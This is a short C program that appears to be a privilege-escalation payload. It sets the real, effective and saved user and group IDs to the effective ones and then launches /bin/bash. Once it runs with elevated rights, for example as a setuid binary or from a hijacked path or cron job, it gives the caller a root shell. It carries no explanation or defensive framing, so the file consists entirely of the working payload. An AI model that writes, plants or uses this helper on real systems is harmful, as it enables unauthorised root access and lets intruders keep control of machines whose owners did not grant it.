#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <string.h>

int main() {

    gid_t gid = getegid();
    uid_t uid = geteuid();
    setresgid(gid,gid,gid); setresuid(uid,uid,uid);
    system("/bin/bash");
    return 0;
}
